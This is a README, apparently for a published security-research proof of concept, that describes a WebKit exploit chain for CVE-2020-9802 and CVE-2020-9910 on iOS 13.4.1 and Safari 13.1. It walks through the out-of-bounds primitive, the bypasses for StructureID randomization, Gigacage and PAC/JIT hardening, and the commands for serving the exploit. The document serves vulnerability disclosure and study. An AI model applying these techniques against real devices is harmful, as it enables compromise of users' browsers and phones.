# WebKit PoC Exploit for iOS 13.4.1 on iPhone Xs and Safari 13.1 on macOS 10.15.4

A proof-of-concept exploit for [CVE-2020-9802](https://bugs.chromium.org/p/project-zero/issues/detail?id=2020). The exploit targets WebKit on iOS 13.4.1 on an iPhone Xs.

## Vulnerability

CVE-2020-9802 allows OOB access on the JSC heap due to incorrect bounds check elimination due to a bug in CSE. With some more fiddling, it is possible to read or write out-of-bounds at a controlled offset. The exploit uses that to corrupt the length of an adjacent JSArray. This is implemented in the function `hax`.
Next, in `setup_addrof_fakeobj`, it sets up the addrof and fakeobj primitives by reading from/writing to a unboxed double array through the overlapping JSValue array.

## Bypassing StructureID randomization

Afterwards, the somewhat newer StructureID randomization mitigation has to be bypassed. It attempts to stop the exploit method described [here](http://www.phrack.org/papers/attacking_javascript_engines.html) which relies on predictable StructureIDs. However, not all code paths check the StructureID of a (potentially faked) JSObject. In particular, indexed accesses into fast JSArrays never load the structure but only the JSCell header flags (containing the indexing type) and the butterfly (the array storage). With that, it becomes possible to fake a JSArray and read a valid JSCell header and thus a valid StructureID from memory. With that, a fully-functional unboxed double JSArray can be faked and then used for somewhat limited arbitrary reads and writes in memory.

## Bypassing Gigacage

Note: This step isn't strictly necessary as the current read/write primitives should be powerful enough (although likely significantly slower) to finish the rest of this exploit.

The Gigacage is used to cage backing buffers of objects like TypedArrays and strings so that they cannot be abused for arbitrary memory read/write. It is possible to bypass the Gigacage mechanism if one can overwrite data on the stack (either due to a bug or through an intermediate read-write primitive as is the case here): an access to a typed array in JIT compiled code is implemented with two DFG operations: a GetIndexedPropertyStorage operation followed by a GetByVal. The GetIndexedPropertyStorage uncages the backing storage pointer and outputs the raw pointer, the GetByVal then uses that to load/store a value. It is then possible to cause the raw pointer produced by GetIndexedPropertyStorage to be spilled to the stack where it can then be modified before it is used to access memory. The `memhax` function implements this.

At this point, the exploit has achieved stable arbitrary memory read/write through the 'memory' object.

## Bypassing PAC/JIT hardening

Note: this is a PoC for [CVE-2020-9910](https://bugs.chromium.org/p/project-zero/issues/detail?id=2042).

The final step is to gain code execution. On macOS, this simply means finding and writing to the JIT region. However, on iOS a combination of APRR and PAC protect the JIT region from an attacker with arbitrary read/write.

WebKit has support for in-process signal handling. This is for example used by some JIT optimizations in JSC. The main signal handler is `catch_mach_exception_raise_state` in Signals.cpp, which will traverse a linked list of handlers and call each one of them. If any of the handlers returns success, the signal is treated as handled and the thread will continue. This enables the following attack:

1. The linked list of handlers is turned into a cycle, causing `catch_mach_exception_raise_state` to loop infinitely upon catching a signal
2. A crash is triggered in another thread, for example in a WebWorker. A GCD thread is now "stuck" in `catch_mach_exception_raise_state`
3. The main thread searches the stacks for the stackframe of `catch_mach_exception_raise_state`. Once found, it has access to the reply mach message of `catch_mach_exception_raise_state` and with that to the context (registers + stack) of the crashed thread. It can modify them arbitrarily except for PC which is protected by PAC. After modifying the state and marking the exception as property handled in the reply message, it fixes the linked list of handlers, causing `catch_mach_exception_raise_state` in the other thread to finish
4. The crashed thread now resumes execution with attacker-controlled registers and/or stack content

It should also be possible to catch multiple signals following each other by first making a copy of the handlers list/cycle, then swapping the "active" and "inactive" exception hander lists before repairing the now inactive handler list. The current exception handler will then return, but if a new exception is immediately raised, the handling thread will again be stuck in `catch_mach_exception_raise_state` as it uses the other list which is still a cycle. It is also worth noting that it should be possible to modify the global `activeExceptions` variable in Signals.cpp prior to the installation of signal handlers, thus allowing the attacker to control which exceptions are handled.

This "debugger" now immediately allows brute-forcing PACs as PAC mostly relies on conventional access violations when failing. Moreover, it allows PAC to be bypassed trivially for some pointers, namely in cases where the authentication and use are two separate instructions, with the second instruction triggering a crash. The PoC demonstrates this by bypassing the PAC protecting a TypedArray's backing storage pointer: first, a TypedArray's backing storage pointer in a worker is corrupted, then accessed. This will cause the AUTDB instruction to fail, leaving the pointer clobbered and causing a crash when the pointer is subsequently accessed. Next, this crash is "handled" with the debugger and the register containing the clobbered pointer is replaced with an arbitrary pointer. The worker then continues and re-executes the access instruction which now succeeds and thus accesses an address of the attacker's choosing.

With this, there are now different possibilities for achieving arbitrary native code execution (i.e. bypassing the JIT hardening):
- Corrupt the AssemblerBuffer so arbitrary instructions are copied into the JIT region by the LinkBuffer. This will cause the computed hashes to mismatch and the linker to crash, but that only happens after the instructions have been copied and the crash can then simply be caught
- Crash during one of the writes into the JIT region in LinkBuffer::copyCompactAndLinkCode (by corrupting the destination pointer prior to that) and change the content of the source register so that an arbitrary instruction is written into the JIT region while the original instruction is used for the hash computation
- Crash during LinkBuffer::copyCompactAndLinkCode and resume execution somewhere else. This should leave the JIT region writable (although not executable) for that thread
- Brute-force a PAC code (e.g. by repeatedly accessing, crashing, and then changing a PAC protected pointer), then JOP into one of the functions into which performJITMemcpy is inlined

## Demo

To run the PoC install tornado, for example via `sudo python3 -m pip install tornado`, then start the exploit server: `python3 server.py` and browse to port 8000 with Mobile Safari on an iPhone Xs on iOS 13.4.1.

A successful run of the exploit should look like this:

    [LOG] Fixing exception handlers...
    [LOG] Received message from worker: 42
